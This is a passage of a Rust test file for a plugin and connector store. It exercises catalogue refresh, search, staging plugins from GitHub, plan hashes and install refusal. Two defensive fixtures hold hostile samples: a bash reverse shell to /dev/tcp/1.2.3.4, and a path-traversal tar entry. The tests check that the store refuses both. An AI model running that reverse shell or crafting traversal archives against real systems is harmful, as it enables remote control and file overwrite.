//! The store's service end to end, against a scripted network, a scripted gateway and an in-memory connector engine: refresh and
//! search over the saved real responses, staging a plugin from a (fake) GitHub, the plan and its hash across the layers, install
//! through each route and refusal on a changed plan, the connector's governed allowlist, updates, kill list, sources the user adds.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::too_many_lines)]

use std::collections::BTreeMap;
use std::sync::{Arc, Mutex};

use async_trait::async_trait;
use serde_json::{Value, json};

use super::Store;
use super::backend::{Backend, Host};
use super::net::{Ask, Fetcher, Hosts, Reply};
use super::stage_tests::{TarEntry, file, tgz};
use super::types::{
    HostBasis, InstallReceipt, InstallRequest, ItemKind, Layer, PinKind, ScanVerdict, Scope,
    ScopeLevel, StoreFilter, Tier, UpdateStatus,
};
use crate::config::Limits;
use crate::connectors::{Engine, Installed, McpOps, Opener, TestReport};
use crate::error::{Error, Result};
use crate::secrets::store::MemoryStore;

const REGISTRY: &str = include_str!("fixtures/mcp-registry.servers.json");
const OFFICIAL: &str = include_str!("fixtures/claude-plugins-official.marketplace.json");
const SKILLS: &str = include_str!("fixtures/anthropic-skills.marketplace.json");
const ENGINE: &str = include_str!("fixtures/engine-plugin-catalog.json");
const REFS: &[u8] = include_bytes!("fixtures/git-info-refs.bin");

fn head() -> String {
    super::github::parse_refs(REFS).unwrap().head.unwrap()
}

// ---------------------------------------------------------------- the network

type Route = dyn Fn(&str, &Ask<'_>) -> Result<Reply> + Send + Sync;

struct Net {
    route: Box<Route>,
    seen: Mutex<Vec<String>>,
}

impl Fetcher for Net {
    fn get(&self, url: &str, _hosts: &Hosts, ask: &Ask<'_>) -> Result<Reply> {
        self.seen.lock().unwrap().push(url.to_owned());
        (self.route)(url, ask)
    }
}

fn ok(body: impl Into<Vec<u8>>) -> Result<Reply> {
    Ok(Reply {
        status: 200,
        body: body.into(),
        etag: Some("\"e1\"".into()),
        final_url: String::new(),
    })
}

fn down() -> Error {
    Error::Store("hx.store.source_unreachable", "no network".into())
}

/// A network that serves the saved responses of every source.
fn world(extra: impl Fn(&str) -> Option<Result<Reply>> + Send + Sync + 'static) -> Arc<Net> {
    Arc::new(Net {
        seen: Mutex::new(Vec::new()),
        route: Box::new(move |url, ask| {
            if let Some(r) = extra(url) {
                return r;
            }
            if url.starts_with(super::service::ENGINE_CATALOGUE_URL) {
                return if ask.etag == Some("\"e1\"") {
                    Ok(Reply {
                        status: 304,
                        body: vec![],
                        etag: Some("\"e1\"".into()),
                        final_url: String::new(),
                    })
                } else {
                    ok(ENGINE)
                };
            }
            if url.starts_with("https://registry.modelcontextprotocol.io/v0.1/servers") {
                return ok(REGISTRY);
            }
            if url.contains(".git/info/refs") {
                return ok(REFS);
            }
            if url.contains("claude-plugins-official/") && url.ends_with("marketplace.json") {
                return ok(OFFICIAL);
            }
            if url.contains("/skills/") && url.ends_with("marketplace.json") {
                return ok(SKILLS);
            }
            Err(down())
        }),
    })
}

// ---------------------------------------------------------------- the gateway and the engine

type Script = dyn Fn(&str, &Value) -> Result<Value> + Send + Sync;

struct Gateway {
    script: Box<Script>,
    calls: Mutex<Vec<(String, Value)>>,
}

#[async_trait]
impl Backend for Gateway {
    async fn rpc(&self, method: &str, params: &Value) -> Result<Value> {
        self.calls
            .lock()
            .unwrap()
            .push((method.to_owned(), params.clone()));
        (self.script)(method, params)
    }
    async fn cli(&self, args: &[&str]) -> Result<crate::hermes::cli::Output> {
        self.calls
            .lock()
            .unwrap()
            .push((format!("cli {}", args.join(" ")), Value::Null));
        Ok(crate::hermes::cli::Output {
            code: 0,
            stdout: String::new(),
            stderr: String::new(),
        })
    }
}

impl Gateway {
    fn called(&self, method: &str) -> Vec<Value> {
        self.calls
            .lock()
            .unwrap()
            .iter()
            .filter(|(m, _)| m == method)
            .map(|(_, p)| p.clone())
            .collect()
    }
    fn order(&self) -> Vec<String> {
        self.calls
            .lock()
            .unwrap()
            .iter()
            .map(|(m, _)| m.clone())
            .collect()
    }
}

#[derive(Default)]
struct Mem {
    servers: BTreeMap<String, Value>,
    config: BTreeMap<String, String>,
    switched: Vec<(String, bool)>,
}

struct MemMcp(Mutex<Mem>);

#[async_trait]
impl McpOps for MemMcp {
    async fn list(&self) -> Result<Vec<Installed>> {
        Ok(self
            .0
            .lock()
            .unwrap()
            .servers
            .keys()
            .map(|n| Installed {
                name: n.clone(),
                enabled: true,
                status: "connected".into(),
                ..Installed::default()
            })
            .collect())
    }
    async fn add(&self, name: &str, config: &Value) -> Result<()> {
        self.0
            .lock()
            .unwrap()
            .servers
            .insert(name.to_owned(), config.clone());
        Ok(())
    }
    async fn test(&self, _name: &str) -> Result<TestReport> {
        Ok(TestReport {
            ok: true,
            tools: vec![],
            error: None,
            prompts: None,
            resources: None,
            oauth_needed: false,
            signin_needed: false,
        })
    }
    async fn remove(&self, name: &str) -> Result<()> {
        self.0.lock().unwrap().servers.remove(name);
        Ok(())
    }
    async fn set_enabled(&self, name: &str, enabled: bool) -> Result<()> {
        self.0
            .lock()
            .unwrap()
            .switched
            .push((name.to_owned(), enabled));
        Ok(())
    }
    async fn config_get(&self, key: &str) -> Result<Option<Value>> {
        let m = self.0.lock().unwrap();
        if let Some(v) = m.config.get(key) {
            return Ok(Some(serde_json::from_str(v).unwrap_or_else(|_| json!(v))));
        }
        let prefix = format!("{key}.");
        let sub: serde_json::Map<String, Value> = m
            .config
            .iter()
            .filter_map(|(k, v)| k.strip_prefix(&prefix).map(|r| (r.to_owned(), json!(v))))
            .collect();
        Ok((!sub.is_empty()).then_some(Value::Object(sub)))
    }
    async fn config_set(&self, key: &str, value: &str) -> Result<()> {
        self.0
            .lock()
            .unwrap()
            .config
            .insert(key.to_owned(), value.to_owned());
        Ok(())
    }
    async fn config_unset(&self, key: &str) -> Result<()> {
        self.0.lock().unwrap().config.remove(key);
        Ok(())
    }
    async fn restart_gateway(&self, _interrupt: bool) -> Result<()> {
        Ok(())
    }
    async fn running_turns(&self) -> Result<u32> {
        Ok(0)
    }
    async fn oauth_start(&self, _name: &str) -> Result<crate::connectors::ops::OAuthStart> {
        Err(Error::Unavailable("no sign-in here".into()))
    }
    async fn oauth_poll(
        &self,
        _name: &str,
        _id: &str,
    ) -> Result<crate::connectors::ops::OAuthPoll> {
        Err(Error::Unavailable("no sign-in here".into()))
    }
    async fn oauth_cancel(&self, _name: &str, _id: &str) -> Result<()> {
        Ok(())
    }
}

struct NoBrowser;
impl Opener for NoBrowser {
    fn open(&self, _url: &str) -> Result<()> {
        Ok(())
    }
}

struct FakeHost {
    engine: Arc<Engine>,
    gateway: Arc<Gateway>,
}

impl Host for FakeHost {
    fn bot(&self, profile: Option<String>) -> Result<String> {
        Ok(profile.unwrap_or_else(|| "default".into()))
    }
    fn connectors(&self, _bot: &str) -> Result<Arc<Engine>> {
        Ok(self.engine.clone())
    }
    fn backend(&self, _bot: &str) -> Result<Arc<dyn Backend>> {
        Ok(self.gateway.clone())
    }
}

struct Rig {
    store: Store,
    net: Arc<Net>,
    gw: Arc<Gateway>,
    mcp: Arc<MemMcp>,
    keys: Arc<MemoryStore>,
    dir: tempfile::TempDir,
}

fn plugin_plan(kind: &str, tree: &Value, hash: &str) -> Value {
    json!({
        "kind": kind, "slug": "x", "tree_sha256": tree,
        "components": [{"type": "command", "name": "new-sdk-app"}],
        "code_runs": [], "hosts": {"basis": "unknown", "hosts": []}, "secrets": [],
        "files_written": [{"path": "<bot>/boopis/compat/plugins/x/", "purpose": "the plugin's files"}],
        "consent": [{"id": "adds", "text": "Add this plugin.", "runs_code": false}], "warnings": [],
        "governed": {"allowed": true, "switch_blocks": false, "text": "Allowed."},
        "cost": {"tools": null, "context_tokens": null},
        "scan": {"verdict": "safe", "scanner": "the plugin's component scan", "findings": []},
        "plugin_hash": hash
    })
}

fn receipt_json(
    id: &str,
    kind: ItemKind,
    layer: Layer,
    pin: &super::types::Pin,
    hash: &str,
) -> Value {
    serde_json::to_value(InstallReceipt {
        item_id: id.into(),
        kind,
        title: None,
        source: id.split(':').next().unwrap().into(),
        layer,
        version: None,
        pinned: pin.clone(),
        plan_hash: hash.into(),
        tree_sha256: None,
        installed_at: "2026-11-21T10:00:00Z".into(),
        scope: Scope {
            level: ScopeLevel::Bot,
            bot: "default".into(),
            project: None,
        },
        files: vec![],
        enabled: true,
        effective: super::types::Effective::NextSession,
        trusted_projects: None,
        previous: None,
        kill_listed: None,
        restart_needed: None,
        steps: vec![],
        notes: vec![],
    })
    .unwrap()
}

fn rig_with(
    net: Arc<Net>,
    script: impl Fn(&str, &Value) -> Result<Value> + Send + Sync + 'static,
) -> Rig {
    let gw = Arc::new(Gateway {
        script: Box::new(script),
        calls: Mutex::new(Vec::new()),
    });
    let mcp = Arc::new(MemMcp(Mutex::new(Mem::default())));
    let keys = Arc::new(MemoryStore::default());
    let engine = Arc::new(Engine::new(
        mcp.clone(),
        keys.clone(),
        Arc::new(NoBrowser),
        Limits::default(),
    ));
    let dir = tempfile::tempdir().unwrap();
    let store = Store::new(
        &dir.path().join("store"),
        Limits::default(),
        net.clone(),
        Arc::new(FakeHost {
            engine,
            gateway: gw.clone(),
        }),
    )
    .unwrap();
    Rig {
        store,
        net,
        gw,
        mcp,
        keys,
        dir,
    }
}

fn quiet() -> impl Fn(&str, &Value) -> Result<Value> + Send + Sync + 'static {
    |m, _| match m {
        "session.active_list" => Ok(json!({"sessions": []})),
        "plugin.boopis.store.list" => Ok(json!({"items": [], "kill_listed": []})),
        "plugin.boopis.store.removed.set" => Ok(json!({"flagged": []})),
        "skills.manage" => Ok(json!({"items": [
            {"name": "pdf", "description": "Read PDFs", "source": "github", "trust": "trusted", "identifier": "anthropics/skills/skills/pdf"},
            {"name": "odd", "description": "Odd one", "source": "clawhub", "trust": "community", "identifier": "odd-abc123"}], "page": 1, "total_pages": 1})),
        _ => Err(Error::Store(
            "hx.store.install_failed",
            format!("unscripted {m}"),
        )),
    }
}

fn request(stage: &str, plan_hash: &str) -> InstallRequest {
    InstallRequest {
        stage_id: stage.into(),
        plan_hash: plan_hash.into(),
        secrets: None,
        restart: None,
    }
}

// ---------------------------------------------------------------- the catalogue

#[tokio::test]
async fn refresh_reads_every_source_and_search_finds_across_them() {
    let r = rig_with(world(|_| None), quiet());
    let sources = r.store.refresh(None).await.unwrap();
    let count = |id: &str| sources.iter().find(|s| s.id == id).unwrap().items.unwrap();
    assert_eq!(count("engine-plugins"), 5);
    assert_eq!(count("mcp-registry"), 7);
    assert_eq!(count("skills-hub"), 2);
    assert!(count("anthropic") > 20, "{}", count("anthropic"));
    assert!(sources.iter().all(|s| s.error.is_none()), "{sources:?}");
    assert!(
        sources
            .iter()
            .find(|s| s.id == "anthropic")
            .unwrap()
            .enabled
            .unwrap(),
        "on by default once its terms were checked"
    );
    let front = r
        .store
        .browse(None, &StoreFilter::default(), None, Some(5))
        .unwrap();
    let connectors: Vec<String> = crate::connectors::catalog::load()
        .unwrap()
        .connectors
        .iter()
        .map(|c| format!("boopis:{}", c.id))
        .collect();
    // boopis's list: each kind most used first, the kinds taking turns (connector, plugin, skill, ...), cut at the front page's size
    let list = crate::store::recommended::load().unwrap();
    let plugins: Vec<String> = list
        .plugins
        .iter()
        .map(|e| format!("boopis:plugins/{}", e.id))
        .collect();
    let skills: Vec<String> = list
        .skills
        .iter()
        .map(|e| format!("boopis:skills/{}", e.id))
        .collect();
    let mut curated: Vec<String> = Vec::new();
    for n in 0..connectors.len().max(plugins.len()).max(skills.len()) {
        for kind in [&connectors, &plugins, &skills] {
            curated.extend(kind.get(n).cloned());
        }
    }
    curated.truncate(super::service::FRONT_PAGE);
    let rec: Vec<String> = front
        .recommended
        .as_ref()
        .unwrap()
        .iter()
        .map(|i| i.id.clone())
        .collect();
    assert_eq!(
        rec, curated,
        "the front page leads with boopis's own list, most popular first"
    );
    // Browse > Connectors, before any search: boopis's list first, most popular first, then the other sources' connectors
    let conn = r
        .store
        .browse(
            None,
            &StoreFilter {
                kind: Some(ItemKind::Connector),
                ..StoreFilter::default()
            },
            None,
            Some(100),
        )
        .unwrap();
    let ids: Vec<String> = conn.items.iter().map(|i| i.id.clone()).collect();
    assert_eq!(ids[..connectors.len()], connectors[..]);
    assert!(
        ids.len() > connectors.len(),
        "the registry's connectors follow"
    );
    // Browse > Skills and > Plugins: boopis's own, each in its own most used first, before the other sources'
    for (kind, mine) in [(ItemKind::Skill, &skills), (ItemKind::Plugin, &plugins)] {
        let page = r
            .store
            .browse(
                None,
                &StoreFilter {
                    kind: Some(kind),
                    ..StoreFilter::default()
                },
                None,
                Some(100),
            )
            .unwrap();
        let ids: Vec<String> = page.items.iter().map(|i| i.id.clone()).collect();
        assert_eq!(ids[..mine.len()], mine[..], "{kind:?}: most used first");
    }
    assert!(front.total > 30 && !front.stale && !front.offline);
    assert!(front.refreshed_at.is_some());
    let hit = r
        .store
        .browse(Some("2kw"), &StoreFilter::default(), None, None)
        .unwrap();
    assert_eq!(hit.items[0].id, "mcp-registry:ai.2kw/mcp-server");
    let only_skills = r
        .store
        .browse(
            Some("pdf"),
            &StoreFilter {
                kind: Some(ItemKind::Skill),
                ..StoreFilter::default()
            },
            None,
            None,
        )
        .unwrap();
    assert!(
        only_skills
            .items
            .iter()
            .any(|i| i.id == "anthropic:anthropics/skills/skills/pdf")
    );
    assert!(only_skills.items.iter().all(|i| i.kind == ItemKind::Skill));
    assert!(
        r.net
            .seen
            .lock()
            .unwrap()
            .iter()
            .all(|u| !u.contains("2kw")),
        "a query never leaves the machine"
    );
}

#[tokio::test]
async fn the_engine_catalogue_is_read_conditionally_and_a_304_keeps_the_cache() {
    let r = rig_with(world(|_| None), quiet());
    r.store.refresh(Some("engine-plugins")).await.unwrap();
    let again = r.store.refresh(Some("engine-plugins")).await.unwrap();
    assert_eq!(
        again
            .iter()
            .find(|s| s.id == "engine-plugins")
            .unwrap()
            .items,
        Some(5)
    );
    let urls: Vec<String> = r.net.seen.lock().unwrap().clone();
    assert_eq!(
        urls.iter()
            .filter(|u| u.starts_with(super::service::ENGINE_CATALOGUE_URL))
            .count(),
        2
    );
}

#[tokio::test]
async fn an_unreachable_source_keeps_its_last_copy_and_says_so() {
    let up = Arc::new(Mutex::new(true));
    let u2 = up.clone();
    let r = rig_with(
        world(move |_| (!*u2.lock().unwrap()).then(|| Err(down()))),
        quiet(),
    );
    r.store.refresh(Some("mcp-registry")).await.unwrap();
    *up.lock().unwrap() = false;
    let e = r.store.refresh(Some("mcp-registry")).await.unwrap_err();
    assert_eq!(e.code(), "hx.store.source_unreachable");
    let s = r
        .store
        .sources()
        .into_iter()
        .find(|s| s.id == "mcp-registry")
        .unwrap();
    assert_eq!(s.items, Some(7), "the last good copy is still there");
    assert!(s.error.is_some());
    let page = r
        .store
        .browse(
            None,
            &StoreFilter {
                source: Some("mcp-registry".into()),
                ..StoreFilter::default()
            },
            None,
            None,
        )
        .unwrap();
    assert!(page.stale && page.offline);
    assert!(page.items.iter().any(|i| i.source == "mcp-registry"));
    // Everything down and nothing cached is `offline`.
    let fresh = rig_with(world(|_| Some(Err(down()))), |_, _| {
        Err(Error::Unavailable("the engine is not running".into()))
    });
    assert_eq!(
        fresh.store.refresh(None).await.unwrap_err().code(),
        "hx.store.offline"
    );
    assert!(
        fresh
            .store
            .browse(None, &StoreFilter::default(), None, None)
            .unwrap()
            .total
            >= 1,
        "boopis's own list needs no network"
    );
}

#[tokio::test]
async fn a_source_says_whether_a_read_reaches_it_and_why_a_read_failed() {
    let r = rig_with(world(|_| Some(Err(down()))), |_, _| {
        Err(Error::Unavailable("the engine is not running".into()))
    });
    let s = |id: &str| r.store.sources().into_iter().find(|s| s.id == id).unwrap();
    // Nothing read yet: every source a read reaches is due, the rest are not reached by a read at all.
    for id in ["engine-plugins", "skills-hub", "anthropic", "mcp-registry"] {
        assert_eq!(
            (s(id).refreshable, s(id).stale, s(id).refreshed_at.is_none()),
            (Some(true), Some(true), true),
            "{id}"
        );
    }
    for id in ["boopis", "github", "marketplace-url", "local"] {
        assert_eq!(
            (s(id).refreshable, s(id).stale),
            (Some(false), Some(false)),
            "{id}"
        );
    }
    assert!(s("boopis").refreshed_at.is_some() && s("boopis").items >= Some(1));
    // Each read that fails says why in plain words, naming where it could not reach (never the engine's address), and stays due.
    for id in ["engine-plugins", "skills-hub", "anthropic", "mcp-registry"] {
        r.store.refresh(Some(id)).await.unwrap_err();
    }
    assert_eq!(
        s("mcp-registry").error.as_deref(),
        Some(
            "Could not reach registry.modelcontextprotocol.io. Check the connection or proxy, then read the sources again."
        )
    );
    assert!(
        s("anthropic")
            .error
            .unwrap()
            .starts_with("Could not reach github.com.")
    );
    assert!(
        s("engine-plugins")
            .error
            .unwrap()
            .starts_with("Could not reach the engine's online store.")
    );
    assert!(
        s("skills-hub")
            .error
            .unwrap()
            .starts_with("The engine is not running yet."),
        "{:?}",
        s("skills-hub").error
    );
    assert_eq!(s("mcp-registry").stale, Some(true));
    // A source that is off is never due.
    r.store.set_enabled("mcp-registry", false).unwrap();
    assert_eq!(s("mcp-registry").stale, Some(false));
}

#[tokio::test]
async fn a_source_read_just_now_holds_its_items_and_is_not_due() {
    let r = rig_with(world(|_| None), quiet());
    for id in ["engine-plugins", "skills-hub", "anthropic", "mcp-registry"] {
        r.store.refresh(Some(id)).await.unwrap();
        let s = r.store.sources().into_iter().find(|s| s.id == id).unwrap();
        assert_eq!(
            (s.stale, s.error.is_none(), s.refreshed_at.is_some()),
            (Some(false), true, true),
            "{id}"
        );
        assert!(s.items.unwrap() > 0, "{id}");
    }
    assert!(
        !r.store
            .browse(None, &StoreFilter::default(), None, None)
            .unwrap()
            .stale
    );
}

#[tokio::test]
async fn the_registry_is_read_again_incrementally_and_its_deleted_entries_go() {
    let calls = Arc::new(Mutex::new(Vec::<String>::new()));
    let c2 = calls.clone();
    let r = rig_with(
        world(move |url| {
            if url.starts_with("https://registry.modelcontextprotocol.io") {
                c2.lock().unwrap().push(url.to_owned());
                if url.contains("updated_since") {
                    let mut doc: Value = serde_json::from_str(REGISTRY).unwrap();
                    let rows = doc["servers"].as_array_mut().unwrap();
                    rows.truncate(1);
                    rows[0]["_meta"]["io.modelcontextprotocol.registry/official"]["status"] =
                        json!("deleted");
                    return Some(ok(doc.to_string()));
                }
            }
            None
        }),
        quiet(),
    );
    r.store.refresh(Some("mcp-registry")).await.unwrap();
    assert!(r.store.find("mcp-registry:ai.2kw/mcp-server").is_ok());
    r.store.refresh(Some("mcp-registry")).await.unwrap();
    let urls = calls.lock().unwrap().clone();
    assert!(
        !urls[0].contains("updated_since") && urls[1].contains("updated_since="),
        "{urls:?}"
    );
    assert_eq!(
        r.store
            .find("mcp-registry:ai.2kw/mcp-server")
            .unwrap_err()
            .code(),
        "hx.store.not_found",
        "deleted by the registry"
    );
    assert!(
        r.store.find("mcp-registry:ai.arsentev/contextburn").is_ok(),
        "the rest stayed"
    );
}

#[tokio::test]
async fn a_source_that_is_off_is_not_searched_and_a_builtin_cannot_be_removed() {
    let r = rig_with(world(|_| None), quiet());
    r.store.refresh(None).await.unwrap();
    r.store.set_enabled("mcp-registry", false).unwrap();
    assert!(
        r.store
            .browse(
                None,
                &StoreFilter {
                    source: Some("mcp-registry".into()),
                    ..StoreFilter::default()
                },
                None,
                None
            )
            .unwrap()
            .items
            .is_empty()
    );
    assert!(
        r.store.find("mcp-registry:ai.2kw/mcp-server").is_ok(),
        "an item can still be opened by id"
    );
    assert_eq!(
        r.store.set_enabled("nope", true).unwrap_err().code(),
        "hx.store.invalid_source"
    );
    assert_eq!(
        r.store.source_remove("boopis").unwrap_err().code(),
        "hx.store.invalid_source"
    );
}

#[tokio::test]
async fn host_written_words_never_name_the_engine_and_an_items_own_words_pass_through() {
    let r = rig_with(world(|_| None), quiet());
    r.store.refresh(None).await.unwrap();
    for s in r.store.sources() {
        let words = format!(
            "{} {} {}",
            s.label,
            s.description.clone().unwrap_or_default(),
            s.note.clone().unwrap_or_default()
        );
        assert!(
            !words.to_lowercase().contains("hermes"),
            "{}: {words}",
            s.id
        );
    }
    let engine_item = r.store.find("engine-plugins:0bull").unwrap().item;
    assert!(
        engine_item.summary.to_lowercase().contains("hermes"),
        "the item's own content is passed through for data-store-item to mark"
    );
}

// ---------------------------------------------------------------- stage, plan, install: a plugin from GitHub

fn plugin_tarball(sha: &str, extra: &[(&str, &[u8])]) -> Vec<u8> {
    let pax = format!("52 comment={sha}\n");
    let mut entries = vec![
        TarEntry {
            name: "pax_global_header",
            kind: b'g',
            mode: 0o666,
            data: Box::leak(pax.into_bytes().into_boxed_slice()),
            link: "",
        },
        file(
            "o-r-abc/plugins/agent-sdk-dev/.claude-plugin/plugin.json",
            br#"{"name":"agent-sdk-dev","version":"1.0.0"}"#,
        ),
        file(
            "o-r-abc/plugins/agent-sdk-dev/commands/new-sdk-app.md",
            b"# new",
        ),
        file("o-r-abc/README.md", b"not selected"),
    ];
    for (name, data) in extra {
        entries.push(file(name, data));
    }
    tgz(&entries)
}

fn github_world(sha: String, tarball: Vec<u8>) -> Arc<Net> {
    world(move |url| {
        url.starts_with("https://codeload.github.com/").then(|| {
            assert!(
                url.ends_with(&sha),
                "the tarball of the pinned commit: {url}"
            );
            ok(tarball.clone())
        })
    })
}

fn plugin_script(
    counter: Arc<Mutex<u32>>,
) -> impl Fn(&str, &Value) -> Result<Value> + Send + Sync + 'static {
    move |m, p| match m {
        "plugin.boopis.store.prepare" => {
            assert!(
                std::path::Path::new(p["staged_dir"].as_str().unwrap())
                    .join(".claude-plugin/plugin.json")
                    .is_file()
            );
            assert_eq!(p["kind"], "plugin");
            let n = *counter.lock().unwrap();
            Ok(plugin_plan(
                "plugin",
                &p["tree_sha256"],
                &format!("plugin-hash-{n}"),
            ))
        }
        "plugin.boopis.store.confirm" => {
            let pin: super::types::Pin = serde_json::from_value(p["pinned"].clone()).unwrap();
            Ok(
                json!({"receipt": receipt_json(p["item_id"].as_str().unwrap(), ItemKind::Plugin, Layer::Plugin, &pin, p["plan_hash"].as_str().unwrap())}),
            )
        }
        "session.active_list" => Ok(json!({"sessions": [{"id": "a", "status": "working"}]})),
        "plugin.boopis.store.list" => Ok(json!({"items": [], "kill_listed": []})),
        "plugin.boopis.store.removed.set" => Ok(json!({"flagged": []})),
        _ => Err(Error::Store(
            "hx.store.install_failed",
            format!("unscripted {m}"),
        )),
    }
}

async fn staged_plugin(r: &Rig) -> (super::types::StageResult, super::types::InstallPlan) {
    r.store.refresh(Some("anthropic")).await.unwrap();
    let st = r
        .store
        .stage("anthropic:agent-sdk-dev", None)
        .await
        .unwrap();
    let plan = r.store.plan(&st.stage_id, None, None).await.unwrap();
    (st, plan)
}

#[tokio::test]
async fn a_plugin_is_staged_from_its_pinned_commit_planned_with_the_plugins_half_and_installed() {
    let sha = head();
    let counter = Arc::new(Mutex::new(1));
    let r = rig_with(
        github_world(sha.clone(), plugin_tarball(&sha, &[])),
        plugin_script(counter),
    );
    let (st, plan) = staged_plugin(&r).await;
    assert_eq!(st.files, 2, "only the plugin's folder was kept");
    assert_eq!(st.pinned.kind, PinKind::Commit);
    assert_eq!(st.pinned.value, sha);
    assert_eq!(st.scan.verdict, ScanVerdict::Safe);
    let tree = st.tree_sha256.clone().unwrap();
    assert_eq!(
        super::stage::tree_sha256(
            &r.dir
                .path()
                .join("store/staging")
                .join(&st.stage_id)
                .join("tree")
        )
        .unwrap(),
        tree
    );
    assert_eq!(
        (plan.kind, plan.layer, plan.tier),
        (ItemKind::Plugin, Layer::Plugin, Tier::Verified)
    );
    assert_eq!(plan.tree_sha256.as_deref(), Some(tree.as_str()));
    assert_eq!(plan.stage_id.as_deref(), Some(st.stage_id.as_str()));
    assert_eq!(plan.components[0].name, "new-sdk-app");
    assert_eq!(plan.sessions_open, Some(1));
    assert!(
        plan.warnings
            .iter()
            .any(|w| w.code == "next-session" && w.text.contains("1 session has a turn running"))
    );
    assert!(
        !plan.warnings.iter().any(|w| w.code == "unreviewed"),
        "Anthropic's own plugin is verified by its source"
    );
    assert_eq!(plan.plan_hash, super::plan::plan_hash(&plan));
    let receipt = r
        .store
        .install(request(&st.stage_id, &plan.plan_hash), None, false)
        .await
        .unwrap();
    assert_eq!(
        (receipt.item_id.as_str(), receipt.layer),
        ("anthropic:agent-sdk-dev", Layer::Plugin)
    );
    let confirm = &r.gw.called("plugin.boopis.store.confirm")[0];
    assert_eq!(confirm["plugin_hash"], "plugin-hash-1");
    assert_eq!(
        confirm["plan_hash"],
        json!(plan.plan_hash),
        "the host's hash goes to the receipt only"
    );
    assert_eq!(confirm["tree_sha256"], json!(tree));
    assert!(
        r.store.staging.dir(&st.stage_id).is_err(),
        "the staging folder is gone after the install"
    );
}

#[tokio::test]
async fn an_install_that_names_another_hash_or_meets_a_changed_plugin_plan_is_refused() {
    let sha = head();
    let counter = Arc::new(Mutex::new(1));
    let r = rig_with(
        github_world(sha.clone(), plugin_tarball(&sha, &[])),
        plugin_script(counter.clone()),
    );
    let (st, plan) = staged_plugin(&r).await;
    let e = r
        .store
        .install(request(&st.stage_id, &"0".repeat(64)), None, false)
        .await
        .unwrap_err();
    assert_eq!(e.code(), "hx.store.plan_changed");
    *counter.lock().unwrap() = 2; // the plugin's own plan now differs (its hash), though the staged tree did not change
    let e = r
        .store
        .install(request(&st.stage_id, &plan.plan_hash), None, false)
        .await
        .unwrap_err();
    assert_eq!(e.code(), "hx.store.plan_changed");
    assert!(
        r.gw.called("plugin.boopis.store.confirm").is_empty(),
        "nothing was handed to the plugin"
    );
    assert!(
        r.store.staging.dir(&st.stage_id).is_ok(),
        "the copy stays for another look"
    );
    // An install with no plan at all is the same refusal.
    let st2 = r
        .store
        .stage("anthropic:agent-sdk-dev", None)
        .await
        .unwrap();
    assert_eq!(
        r.store
            .install(request(&st2.stage_id, &plan.plan_hash), None, false)
            .await
            .unwrap_err()
            .code(),
        "hx.store.plan_changed"
    );
}

#[tokio::test]
async fn the_plan_hash_is_the_same_for_the_same_staged_item_and_new_for_another_scope() {
    let sha = head();
    let r = rig_with(
        github_world(sha.clone(), plugin_tarball(&sha, &[])),
        plugin_script(Arc::new(Mutex::new(1))),
    );
    let (st, plan) = staged_plugin(&r).await;
    let again = r.store.plan(&st.stage_id, None, None).await.unwrap();
    assert_eq!(again.plan_hash, plan.plan_hash);
    let project = Scope {
        level: ScopeLevel::BotProject,
        bot: "default".into(),
        project: Some("/work/app".into()),
    };
    let other = r
        .store
        .plan(&st.stage_id, Some(project), None)
        .await
        .unwrap();
    assert_ne!(
        other.plan_hash, plan.plan_hash,
        "trust for a project is part of what the user agrees to"
    );
    assert_eq!(
        r.store
            .plan(
                &st.stage_id,
                Some(Scope {
                    level: ScopeLevel::BotProject,
                    bot: "default".into(),
                    project: None
                }),
                None
            )
            .await
            .unwrap_err()
            .code(),
        "hx.invalid_params"
    );
    assert_eq!(
        r.store
            .plan(
                &st.stage_id,
                Some(Scope {
                    level: ScopeLevel::Bot,
                    bot: "someone-else".into(),
                    project: None
                }),
                None
            )
            .await
            .unwrap_err()
            .code(),
        "hx.invalid_params"
    );
}

#[tokio::test]
async fn a_tarball_of_another_commit_or_with_no_commit_is_a_digest_mismatch() {
    let sha = head();
    let other = "f".repeat(40);
    let r = rig_with(
        github_world(sha.clone(), plugin_tarball(&other, &[])),
        plugin_script(Arc::new(Mutex::new(1))),
    );
    r.store.refresh(Some("anthropic")).await.unwrap();
    assert_eq!(
        r.store
            .stage("anthropic:agent-sdk-dev", None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.digest_mismatch"
    );
    let bare = tgz(&[file(
        "o-r/plugins/agent-sdk-dev/.claude-plugin/plugin.json",
        br#"{"name":"a"}"#,
    )]);
    let r = rig_with(
        github_world(sha, bare),
        plugin_script(Arc::new(Mutex::new(1))),
    );
    r.store.refresh(Some("anthropic")).await.unwrap();
    assert_eq!(
        r.store
            .stage("anthropic:agent-sdk-dev", None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.digest_mismatch"
    );
    let left: Vec<_> = std::fs::read_dir(r.dir.path().join("store/staging"))
        .map(Iterator::count)
        .into_iter()
        .collect();
    assert_eq!(
        left.first().copied().unwrap_or(0),
        0,
        "a failed stage leaves no folder"
    );
}

#[tokio::test]
async fn a_dangerous_tree_and_a_hostile_one_are_refused_and_leave_nothing() {
    let sha = head();
    let bad = plugin_tarball(
        &sha,
        &[(
            "o-r-abc/plugins/agent-sdk-dev/scripts/x.sh",
            b"bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n",
        )],
    );
    let r = rig_with(
        github_world(sha.clone(), bad),
        plugin_script(Arc::new(Mutex::new(1))),
    );
    r.store.refresh(Some("anthropic")).await.unwrap();
    assert_eq!(
        r.store
            .stage("anthropic:agent-sdk-dev", None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.dangerous_verdict"
    );
    let hostile = tgz(&[
        TarEntry {
            name: "pax_global_header",
            kind: b'g',
            mode: 0o666,
            data: Box::leak(
                format!("52 comment={sha}\n")
                    .into_bytes()
                    .into_boxed_slice(),
            ),
            link: "",
        },
        file("o-r-abc/plugins/agent-sdk-dev/../../../evil", b"x"),
    ]);
    let r = rig_with(
        github_world(sha.clone(), hostile),
        plugin_script(Arc::new(Mutex::new(1))),
    );
    r.store.refresh(Some("anthropic")).await.unwrap();
    assert_eq!(
        r.store
            .stage("anthropic:agent-sdk-dev", None)
            .await
            .unwrap_err()
            .code(),
        "hx.store.unsafe_archive"
    );
    assert_eq!(
        std::fs::read_dir(r.dir.path().join("store/staging"))
            .unwrap()
            .count(),
        0
    );
    let no_manifest = tgz(&[
        TarEntry {
            name: "pax_global_header",
            kind: b'g',
            mode: 0o666,
            data: Box::leak(
                format!("52 comment={sha}\n")
                    .into_bytes()
                    .into_boxed_slice(),
